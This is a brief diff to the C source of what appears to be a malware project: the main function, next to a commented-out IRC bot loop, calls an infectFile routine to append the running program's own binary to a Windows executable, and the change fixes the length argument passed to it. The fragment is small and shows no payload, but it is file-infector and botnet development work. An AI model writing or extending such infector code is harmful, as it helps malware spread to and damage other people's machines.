@@ -2,6 +2,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 
 #include "log.h"
 #include "irc.h"
@@ -21,7 +22,7 @@ int main(int argc, char * argv[])
       botLoop();
     */
 
-    if (infectFile(argv[0], 16, "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
+    if (infectFile(argv[0], strlen(argv[0]), "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
         D2("appendBuf2Bin() failed.\n");
     }
 
